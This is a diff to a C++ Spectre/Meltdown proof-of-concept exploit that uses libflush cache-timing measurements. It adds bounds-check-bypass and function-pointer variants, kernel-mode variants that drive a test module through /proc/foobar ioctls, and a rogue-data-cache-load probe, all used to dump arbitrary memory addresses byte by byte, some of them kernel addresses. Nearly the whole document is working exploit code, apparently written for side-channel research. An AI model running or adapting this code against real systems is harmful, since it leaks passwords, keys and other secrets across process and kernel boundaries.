@@ -7,6 +7,8 @@
 #include <unistd.h>
 #include <setjmp.h>
 #include <sched.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
 
 #ifdef __ANDROID_API__
 #include "android_spectre_Spectre.h"
@@ -17,27 +19,21 @@
 #define LOG(format, ...) fprintf(stderr, format "\n", __VA_ARGS__)
 #endif
 
-
-/* FIXME: It's a mistery: Intel manual says cache width is 64 bytes, but it doesn't seem to work reliably with values smaller than 512 */
-#define BRANCH_PREDICT_TRAINING_COUNT 10
 #define CACHE_LINE_SIZE 1024
 #define ALIGN_CACHE __attribute__ ((aligned (CACHE_LINE_SIZE)))
 
 #define MAIN_THREAD_CPU 0
 #define COUNTER_THREAD_CPU 1
 
-#define CONCAT_(x,y) x##y
-#define CONCAT(x,y) CONCAT_(x,y)
-#define PAD uint8_t ALIGN_CACHE CONCAT(pad_, __LINE__);
-
-
+#define IOCTL_BOUND_CHECK_BYPASS _IOWR('S', 'b', struct bound_check_bypass_request *)
+#define IOCTL_FUNCTION_ARRAY     _IOWR('S', 'f', struct function_array_request *)
 
 class LibFlush {
 public:
   libflush_session_t* session = nullptr;
   int cache_hit_threshold;
 
-  LibFlush(size_t counter_thread_cpu=COUNTER_THREAD_CPU) {
+  LibFlush(size_t counter_thread_cpu) {
     libflush_session_args_t libflush_args = {
       .bind_to_cpu = counter_thread_cpu
     };
@@ -122,72 +118,121 @@ static void sigsegv_handler(int signum) {
 enum class SpectreVariant  : uint8_t {
   None=0,
   BoundsCheckBypass=1,
-  BranchTargetInjection=2,
-  RogueDataCacheLoad=4,
-  GioSyscall=8,
-  All=7
+  FunctionsBoundsCheckBypass=2,
+  BranchTargetInjection=4,
+  RogueDataCacheLoad=8,
+  BoundsCheckBypassKernel=16,
+  FunctionsBoundsCheckBypassKernel=32,
+  DirectAccess=64,
+  All=0xff
 };
 
 
 
-static uint8_t* gio_target_ptr;
-static uint8_t* gio_cached_ptr;
 
-static void victim_gio() {
-    uint8_t value = *gio_target_ptr;
-    volatile uint8_t tmp0 = gio_cached_ptr[(value & (1<<0)) * CACHE_LINE_SIZE];
-    volatile uint8_t tmp1 = gio_cached_ptr[(value & (1<<1)) * CACHE_LINE_SIZE];
-    volatile uint8_t tmp2 = gio_cached_ptr[(value & (1<<2)) * CACHE_LINE_SIZE];
-    volatile uint8_t tmp3 = gio_cached_ptr[(value & (1<<3)) * CACHE_LINE_SIZE];
-    volatile uint8_t tmp4 = gio_cached_ptr[(value & (1<<4)) * CACHE_LINE_SIZE];
-    volatile uint8_t tmp5 = gio_cached_ptr[(value & (1<<5)) * CACHE_LINE_SIZE];
-    volatile uint8_t tmp6 = gio_cached_ptr[(value & (1<<6)) * CACHE_LINE_SIZE];
-    volatile uint8_t tmp7 = gio_cached_ptr[(value & (1<<7)) * CACHE_LINE_SIZE];
-}
 
-typedef void syscall_handler_t();
-syscall_handler_t* gio_call_table[] = {
-    &victim_gio
+
+
+class DataArray {
+public:
+    size_t ALIGN_CACHE data_size;
+    uint8_t ALIGN_CACHE *data;
+
+    DataArray(int n) {
+        data_size = n;
+        data = new uint8_t[n];
+    }
+
+    ~DataArray() {
+        delete data;
+    }
 };
-syscall_handler_t** sys_call_table = (syscall_handler_t**)0xffffffff82400240;     //TODO: Read this from kallsyms
+
+class FunctionArray {
+    static long noop(uint8_t a, const void* b, const void* c) {return a;}
+public:
+    typedef long (*function_ptr_t)(uint8_t, const void*, const void*);
+
+    function_ptr_t ALIGN_CACHE *functions;
+    size_t ALIGN_CACHE functions_size;
+
+    FunctionArray(int n) {
+        functions_size = n;
+        functions = new function_ptr_t[n];
+        for (int i=0; i<n; i++) {
+            functions[i] = noop;
+        }
+    }
+    ~FunctionArray() {
+        delete functions;
+    }
+};
+
+struct FoobarIoctl1 {
+    DataArray *data;
+    uint8_t *cache_probe;
+    uint8_t mask;
+    size_t index;
+};
+
+struct FoobarIoctl2 {
+    size_t function_index;
+    uint8_t arg1;
+    const void *arg2;
+    const void *arg3;
+};
+
 
 class Spectre {
   LibFlush& libflush;
-  uint8_t    ALIGN_CACHE array2[256 * CACHE_LINE_SIZE];
-  uint8_t    ALIGN_CACHE array1[CACHE_LINE_SIZE];
-  size_t     ALIGN_CACHE array1_size;
+  const uint8_t *target_ptr;
+  uint8_t mask;
+
+  DataArray     ALIGN_CACHE data_array = DataArray(256);
+  FunctionArray ALIGN_CACHE function_array = FunctionArray(256);
+  uint8_t       ALIGN_CACHE cache_probe[256 * CACHE_LINE_SIZE];
 
 
 public:
   Spectre(LibFlush& libflush)
   : libflush(libflush)
-  {
-    /* Initialize with zeros to ensure that is not on a copy-on-write zero pages */
-    memset(&array2, 0, sizeof(array2));
-    memset(&array1, 0, sizeof(array1));
-    array1_size = sizeof(array1);
-  }
+  { }
 
-  void victim_variant1(size_t x, uint8_t mask) {
-    if (x < array1_size) {
-      volatile uint8_t tmp = array2[(array1[x] & mask) * CACHE_LINE_SIZE];
+  void victim_variant1(size_t index) {
+    if (index < data_array.data_size) {
+      volatile uint8_t tmp = cache_probe[(data_array.data[index] & mask) * CACHE_LINE_SIZE];
     }
   }
 
-  void victim_variant3(uint8_t* ptr, uint8_t mask) {
-    for (int i=0; i<100; i++) {
+  static long variant1b_exploit(uint8_t mask, const void* target_ptr, const void* cache_probe) {
+    uint8_t value = *(uint8_t*)target_ptr;
+    volatile uint8_t tmp = ((uint8_t*)cache_probe)[(value & mask) * CACHE_LINE_SIZE];
+    return 0;
+  }
+
+  void victim_variant1b(size_t index) {
+    if (index < function_array.functions_size) {
+      function_array.functions[index](mask, (uint8_t*)target_ptr, cache_probe);
+    }
+  }
+
+  void victim_variant3() {
+    for (int i=0; i<10; i++) {
       if (!setjmp(signsegv_jmp)) {
         volatile uint8_t value;
         do {
-          value =  *ptr;
+          value =  *target_ptr;
         } while (!value);
-        volatile uint8_t tmp = array2[(value & mask) * CACHE_LINE_SIZE];
+        volatile uint8_t tmp = cache_probe[(value & mask) * CACHE_LINE_SIZE];
       }
     }
   }
 
   /* Report best guess in value[0] and runner-up in value[1] */
-  void readMemoryByte(const void* target_ptr, SpectreVariant variant, uint8_t value[2], int score[2]) {
+  void readMemoryByte(const uint8_t* target_ptr, SpectreVariant variant, uint8_t value[2], int score[2]) {
+    this->target_ptr = target_ptr;
+    int data_array_size = data_array.data_size;
+    int function_array_size = function_array.functions_size;
     int results[256];
     for (int i = 0; i < 256; i++)
       results[i] = 0;
@@ -203,18 +248,19 @@ public:
 
     for (int tries = 999; tries > 0; tries--) {
       uint8_t result = 0;
-      for (uint8_t mask=1; mask; mask=mask<<1) {
+      for (mask=1; mask; mask=mask<<1) {
         sched_yield();
-        libflush.flush(&array2[mask * CACHE_LINE_SIZE]);
+        libflush.flush(&cache_probe[mask * CACHE_LINE_SIZE]);
 
         // --- Probe using variant 1 ---
         if ((int)variant & (int)SpectreVariant::BoundsCheckBypass) {
-          size_t malicious_x = (size_t)target_ptr - (size_t)array1;
-          for (int i = 599; i >= 0; i--) {
-            size_t training_x = (tries + i) % array1_size;
-            libflush.flush(&array1_size);
+          size_t malicious_x = target_ptr - data_array.data;
 
+          for (int i = 11; i >= 0; i--) {
+            libflush.flush(&data_array.data_size);
             for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+
+            size_t training_x = (tries + i) % data_array_size;
 
             /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
             /* Avoid jumps in case those tip off the branch predictor */
@@ -223,32 +269,125 @@ public:
             x = training_x ^ (x & (malicious_x ^ training_x));
 
             /* Call the victim! */
-            victim_variant1(x, mask);
+            victim_variant1(x);
           }
         }
 
-        // --- Probe using variant 2 ---
-        if ((int)variant & (int)SpectreVariant::RogueDataCacheLoad) {
-          victim_variant3((uint8_t*)target_ptr, mask);
+        // --- Probe using variant 1b ---
+        if ((int)variant & (int)SpectreVariant::FunctionsBoundsCheckBypass) {
+          FunctionArray::function_ptr_t fake_array[] = {
+              variant1b_exploit
+          };
+          size_t malicious_x = fake_array - function_array.functions;
+
+          for (int i = 11; i >= 0; i--) {
+            libflush.flush(&function_array.functions_size);
+            for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+
+            size_t training_x = (tries + i) % function_array_size;
+
+
+            /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
+            /* Avoid jumps in case those tip off the branch predictor */
+            size_t x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if i%6==0, else x=0 */
+            x = (x | (x >> 16)); /* Set x=-1 if i&6=0, else x=0 */
+            x = training_x ^ (x & (malicious_x ^ training_x));
+
+            /* Call the victim! */
+            victim_variant1b(x);
+          }
         }
 
-        // --- Probe using gio's syscall ---
-        if ((int)variant & (int)SpectreVariant::GioSyscall) {
-            gio_target_ptr = (uint8_t*)target_ptr;
-            gio_cached_ptr = array2;
+        // --- Probe using variant 1 inside kernel module via ioctl ---
+        if ((int)variant & (int)SpectreVariant::BoundsCheckBypassKernel) {
+          FILE* foobar = fopen("/proc/foobar", "rw");
+          if (foobar) {
+            size_t malicious_x = target_ptr - data_array.data;
 
-            long offset = gio_call_table - sys_call_table;
-//             printf("sys_call_table=%p, gio_syscall_table=%p, offsef=%ld\n", sys_call_table, victim_gio_ptr, offset);
-            for (int i=0; i<10; i++) {
-                int x = nice(0); //No-op syscall to train branch predictor
+            for (int i = 11; i >= 0; i--) {
+              libflush.flush(&data_array.data_size);
+              for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+
+              size_t training_x = (tries + i) % data_array_size;
+
+              /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
+              /* Avoid jumps in case those tip off the branch predictor */
+              size_t x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if i%6==0, else x=0 */
+              x = (x | (x >> 16)); /* Set x=-1 if i&6=0, else x=0 */
+              x = training_x ^ (x & (malicious_x ^ training_x));
+
+              /* Call the victim! */
+              FoobarIoctl1 ioctl_request = {
+                  .data = &data_array,
+                  .cache_probe = cache_probe,
+                  .mask = mask,
+                  .index = x
+              };
+              int ioctl_ret = ioctl(fileno(foobar), IOCTL_BOUND_CHECK_BYPASS, &ioctl_request);
+              fclose(foobar);
             }
-            //victim_gio();
-            syscall(offset); //Should be the same as calling victim_gio(), but in kernel mode. -- FIXME: Doesn't work
+          }
         }
 
-        libflush.is_cache_hit(&array2[0 * CACHE_LINE_SIZE]);
+        // --- Probe using variant 1b ---
+        if ((int)variant & (int)SpectreVariant::FunctionsBoundsCheckBypassKernel) {
+          FILE* foobar = fopen("/proc/foobar", "rw");
+          if (foobar) {
+            FunctionArray::function_ptr_t* functions_array;
+            size_t functions_array_size;
+            size_t* functions_array_size_ptr;
+
+            fscanf(foobar, " function_array=%p", &functions_array);
+            fscanf(foobar, " function_array_size=%ld", &functions_array_size);
+            fscanf(foobar, " function_array_size_ptr=%p", &functions_array_size_ptr);
+            //printf("function_array=%p, function_array_size=%ld, function_array_size_ptr=%p\n", functions_array, functions_array_size, functions_array_size_ptr);
+
+            FunctionArray::function_ptr_t fake_array[] = {
+                variant1b_exploit
+            };
+            size_t malicious_x = fake_array - functions_array;
+
+            for (int i = 11; i >= 0; i--) {
+              //libflush.flush(functions_array_size);
+              for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+
+              size_t training_x = (tries + i) % functions_array_size;
+
+
+              /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
+              /* Avoid jumps in case those tip off the branch predictor */
+              size_t x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if i%6==0, else x=0 */
+              x = (x | (x >> 16)); /* Set x=-1 if i&6=0, else x=0 */
+              x = training_x ^ (x & (malicious_x ^ training_x));
+
+              /* Call the victim! */
+              FILE* foobar = fopen("/proc/foobar", "rw");
+              if (foobar) {
+                  FoobarIoctl2 ioctl_request = {
+                      .function_index = x,
+                      .arg1 = mask,
+                      .arg2 = target_ptr,
+                      .arg3 = cache_probe
+                  };
+                  int ioctl_ret = ioctl(fileno(foobar), IOCTL_FUNCTION_ARRAY, &ioctl_request);
+                  fclose(foobar);
+              }
+            }
+          }
+        }
+
+        // --- Probe using variant 3 ---
+        if ((int)variant & (int)SpectreVariant::RogueDataCacheLoad) {
+          victim_variant3();
+        }
+
+        // --- Probe using direct access -- That is just a cache attack, tunrelated to speculative execution ---
+        if ((int)variant & (int)SpectreVariant::DirectAccess) {
+          volatile uint8_t tmp = cache_probe[(*target_ptr & mask) * CACHE_LINE_SIZE];
+        }
+
         // --- Check probing result measuring cache timing
-        if (libflush.is_cache_hit(&array2[mask * CACHE_LINE_SIZE])) {
+        if (libflush.is_cache_hit(&cache_probe[mask * CACHE_LINE_SIZE])) {
           result |= mask;
         }
       }
@@ -280,11 +419,11 @@ public:
   }
 
 
-  void dump(const void* target_ptr, size_t target_len) {
-    for (const char* ptr = (const char*)target_ptr; ptr < (const char*)target_ptr + target_len; ptr++) {
+  void dump(const uint8_t* target_ptr, size_t target_len) {
+    for (const uint8_t* ptr = target_ptr; ptr < target_ptr + target_len; ptr++) {
       uint8_t value[2];
       int score[2];
-      readMemoryByte(ptr, SpectreVariant::GioSyscall, value, score);
+      readMemoryByte(ptr, SpectreVariant::FunctionsBoundsCheckBypassKernel, value, score);
 
       LOG(
         "Reading at %p... %s: 0x%02X='%c', score=%d",
@@ -373,7 +512,8 @@ int main(int argc, const char** argv) {
 
   LOG("physical address: %p / %p\n", target_ptr, libflush.to_physical(target_ptr));
 //   target_ptr = 0xffff880000000000 + (const char*)libflush.to_physical(target_ptr);
-//   target_ptr = 0xffff880000000000 + (const char*)0x1ff0c0300;
+//   target_ptr = 0xffff880000000000 + (const char*)0x2cfa3a2c8;
+//   target_ptr = (char*)0xffffffffc0024b90;
 
   if (argc == 3) {
     sscanf(argv[1], "%p", &target_ptr);
@@ -385,7 +525,7 @@ int main(int argc, const char** argv) {
     return -1;
   }
 
-  spectre.dump(target_ptr, target_len);
+  spectre.dump((uint8_t*)target_ptr, target_len);
   return (0);
 }
 #endif
